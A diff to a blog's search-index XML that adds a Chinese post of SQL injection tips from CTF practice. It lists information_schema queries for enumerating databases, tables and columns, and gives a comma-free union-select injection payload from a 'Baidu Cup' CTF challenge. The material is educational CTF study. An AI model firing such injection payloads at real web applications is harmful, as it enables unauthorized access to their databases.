@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>sql注入的一些tip</title>
+      <link href="/2019/11/22/sql-zhu-ru-de-yi-xie-tip/"/>
+      <url>/2019/11/22/sql-zhu-ru-de-yi-xie-tip/</url>
+      
+        <content type="html"><![CDATA[<h3 id="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"><a href="#sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧" class="headerlink" title="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"></a>sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧</h3><h4 id="tips-基础语句"><a href="#tips-基础语句" class="headerlink" title="tips:基础语句"></a>tips:基础语句</h4><pre class=" language-mysql"><code class="language-mysql">show databases;         //查看数据库use xxx;                //使用某个数据库show tables;            //查看该数据库的数据表desc xxx;               //查看该数据表的结构select * from xxx;      //查找某个数据表的所有内容select schema_name from information_schema.schemata;        //猜数据库select table_name from information_schema.tables where table_schema='xxxxx';                                //猜某数据库的数据表Select column_name from information_schema.columns where table_name='xxxxx';                                //猜某表的所有列left(a,b)       //从左侧截取 a 的前 b 位mid(column_name,start[,length])     //从位置start开始，截取column_name字符串的length位，与substr作用相同substr(string, start, length)       //从位置start开始，截取字符串string的length长度，与mid作用相同ascii()         //将某个字符转换成ascii码ord()           //将某个字符转换成ascii码，同ascii()select database() //当前数据库</code></pre><a id="more"></a><h4 id="一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h4><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>记2019年11月园丁励志奖学金校答辩</title>
       <link href="/2019/11/19/ji-2019-nian-11-yue-yuan-ding-li-zhi-jiang-xue-jin-xiao-da-bian/"/>
       <url>/2019/11/19/ji-2019-nian-11-yue-yuan-ding-li-zhi-jiang-xue-jin-xiao-da-bian/</url>
